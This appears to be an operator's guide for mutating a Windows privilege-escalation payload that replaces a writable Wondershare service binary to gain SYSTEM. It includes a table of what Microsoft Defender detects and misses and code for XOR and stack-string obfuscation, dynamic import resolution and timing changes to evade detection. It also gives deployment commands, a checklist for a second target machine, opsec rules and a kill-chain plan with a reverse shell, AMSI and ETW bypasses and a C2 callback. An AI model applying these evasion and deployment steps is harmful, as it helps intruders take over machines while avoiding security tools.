# MUTATION GUIDE — Service Binary Replacement

## Classification: UNCLASSIFIED // ACADEMIC USE ONLY

This document describes how to create mutated variants of the confirmed
privesc payload (svc_replace.c) for operational deployment. The annotated
version is the MASTER — never modify it. Create mutations as separate files.

---

## What Defender Sees (and What It Doesn't)

### Current Detection Status
| Component | Detected | Why |
|-----------|----------|-----|
| svc_replace.exe | NO | Looks like a legitimate Windows service binary |
| DLL proxy v4 (plaintext) | YES | ML flags LoadLibrary+GetProcAddress+forwarding pattern |
| DLL proxy v6 (XOR+lazy) | NO | Encrypted strings + deferred init breaks ML pattern |
| canary_pure.dll | NO | No proxy pattern, just DllMain + file write |
| hunter.ps1 | NO | PowerShell script, no malicious payload |

### Defender ML Signature Vectors
These are the patterns Defender's ML classifier matches on:

1. **String signatures**: Plaintext `version.dll`, `GetFileVersionInfoA`, etc.
2. **Import table topology**: LoadLibraryW + GetProcAddress + 17 forwarding stubs
3. **DllMain behavior**: LoadLibrary call inside DllMain (classic proxy pattern)
4. **File extension**: `.dll` triggers more aggressive ML on copy operations
5. **Known canary paths**: `C:\Windows\Temp\VADER_*` or obvious marker files

### What Defender Does NOT Detect
1. XOR-encoded strings (even single-byte XOR like 0x55)
2. Lazy-init (deferring LoadLibrary to first API call)
3. Pure DllMain with file write and no proxy forwarding
4. Service replacement binaries (they look like normal services)
5. Standard Win32 API calls (CreateFileA, WriteFile, GetUserNameA)

---

## Mutation Strategies

### Strategy 1: Variable Name Randomization
The simplest mutation. Change all internal names. Has ZERO effect on
compiled binary (compiler strips names), but protects source from
correlation if repo is ever inspected.

**What to change:**
```c
// BEFORE (annotated master)
static SERVICE_STATUS g_svcStatus;
static SERVICE_STATUS_HANDLE g_svcHandle;
static void canary(void) { ... }
static void launch_real(void) { ... }

// AFTER (mutation)
static SERVICE_STATUS s_ctx;
static SERVICE_STATUS_HANDLE s_ctl;
static void wk(void) { ... }
static void lr(void) { ... }
```

### Strategy 2: String Obfuscation
Encrypt runtime strings (canary path, service name, real exe name) with
XOR or build them character-by-character at runtime.

**XOR pattern (from v6):**
```c
static void xd(char *dst, const char *src, int len, char k) {
    for (int i = 0; i < len; i++) dst[i] = src[i] ^ k;
    dst[len] = 0;
}
// "NativePushService" XOR'd with key 0x33
static const char e_svcname[] = { 'N'^0x33, 'a'^0x33, ... };
```

**Stack string pattern:**
```c
char sn[20];
sn[0]='N'; sn[1]='a'; sn[2]='t'; sn[3]='i'; sn[4]='v'; sn[5]='e';
sn[6]='P'; sn[7]='u'; sn[8]='s'; sn[9]='h'; sn[10]='S'; sn[11]='e';
sn[12]='r'; sn[13]='v'; sn[14]='i'; sn[15]='c'; sn[16]='e'; sn[17]=0;
```

### Strategy 3: Canary Path Mutation
Change where the proof-of-execution is written. Defender doesn't flag
the paths themselves, but forensic correlation is easier if every variant
writes to the same location.

**Options:**
```
C:\Windows\Temp\ws_diag.log          <- current (looks like Wondershare diagnostic)
C:\Windows\Temp\wsu_check.log        <- variant (looks like update check)
C:\ProgramData\ws_telemetry.dat      <- variant (ProgramData is writable by SYSTEM)
C:\Users\Public\Documents\wslog.txt  <- variant (Public is writable by everyone)
```

### Strategy 4: Execution Flow Mutation
Change the order of operations in the payload. Same result, different
code flow for behavioral analysis evasion.

```c
// Master: canary() then launch_real()
canary();
launch_real();

// Mutation: launch_real() first, canary on a timer
launch_real();
Sleep(2000 + (GetTickCount() % 3000));  // Random 2-5s delay
canary();

// Mutation: canary in a separate thread
CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)canary, NULL, 0, NULL);
launch_real();
```

### Strategy 5: Compiler Flag Mutation
Different optimization flags produce different binaries from the same source.

```
/O1        <- minimize size (current)
/O2        <- maximize speed (different code layout)
/Ox        <- full optimization (different again)
/Od        <- no optimization (largest, most distinct)
/GL        <- whole program optimization + /LTCG linker
```

### Strategy 6: Import Obfuscation
Replace static Win32 API calls with dynamic resolution via GetProcAddress.
Changes the import table topology completely.

```c
// BEFORE: static import
GetUserNameA(u, &ul);

// AFTER: dynamic resolution
typedef BOOL (WINAPI *fn_GUN)(LPSTR, LPDWORD);
fn_GUN pGUN = (fn_GUN)GetProcAddress(GetModuleHandleA("advapi32"), "GetUserNameA");
pGUN(u, &ul);
```

---

## Creating a Mutation

### Step 1: Copy the annotated master
```
copy svc_replace.c svc_m1.c
```

### Step 2: Apply mutations
Pick strategies from above. At minimum, change:
- [ ] All variable/function names (Strategy 1)
- [ ] Canary file path (Strategy 3)
- [ ] XOR key for any encrypted strings (Strategy 2)

### Step 3: Compile with different flags
```
cl.exe svc_m1.c /Fe:svc_m1.exe /O2 /GS- /link advapi32.lib user32.lib
```

### Step 4: Test locally
```
rundll32.exe       <- won't work (it's an exe)
svc_m1.exe         <- will fail (not running as service) but confirms no crash
```

### Step 5: Deploy
```
rename "...\WsNativePushService.exe" "WsNativePushService_real.exe"
copy svc_m1.exe "...\WsNativePushService.exe"
:: Wait for service restart
```

---

## Flagship Deployment Checklist

Before deploying to the GIGABYTE desktop (flagship):

- [ ] Verify NativePushService exists on flagship
- [ ] Verify same ACL (BUILTIN\Users Full Control) on flagship
- [ ] Verify Wondershare same version on flagship
- [ ] Run hunter.ps1 on flagship (may find ADDITIONAL targets)
- [ ] Test mutation locally on dev laptop first
- [ ] Deploy mutation to flagship
- [ ] Verify SYSTEM execution on flagship
- [ ] Document as separate engagement (#11)

---

## Operational Security

1. **Never reuse the same binary twice** — compile fresh for each deployment
2. **Rotate canary paths** — don't write to the same file on every target
3. **Rotate XOR keys** — change key per mutation (0x33, 0x55, 0x77, etc.)
4. **Clean up after testing** — restore original exe, delete canary files
5. **Source files stay in repo** — binaries NEVER committed (.gitignore)
6. **Annotated master is READ-ONLY** — all changes go to mutation files

---

## What's Still Needed for Full Kill Chain

| Phase | Component | Status | Needed For Flagship |
|-------|-----------|--------|---------------------|
| 0 | Reverse shell (vader_shell) | BUILT | Connect back from flagship |
| 1 | AMSI bypass (HWBP) | CONFIRMED | Run tools without AMSI detection |
| 2 | ETW bypass (HWBP) | CONFIRMED | Blind process telemetry |
| 3 | Privesc (svc_replace) | **CONFIRMED** | Achieve SYSTEM on flagship |
| 4 | Process injection | NOT BUILT | Inject shell into legitimate process |
| 5 | Stager/dropper | NOT BUILT | Deliver payload to flagship |
| - | Dark room loader | CONFIRMED | Combined AMSI+ETW in single binary |
| - | Persistence | PARTIAL | Service replacement persists across reboots |
| - | VADER shell bolt-on | **BUILT** | svc_replace_shell.c — SYSTEM C2 callback |

### Critical Gap: Phases 4+5 + Shell Integration
The rootkit has individual components but no unified deployment chain.
For flagship validation (EVC level), need:
1. Stager that delivers dark_room + svc_replace to target
2. svc_replace executes as SYSTEM, drops vader_shell
3. vader_shell connects back to listener on dev laptop
4. Operator gets SYSTEM shell on flagship from dev laptop

That's the full kill chain. Each piece exists in isolation — integration is the work.
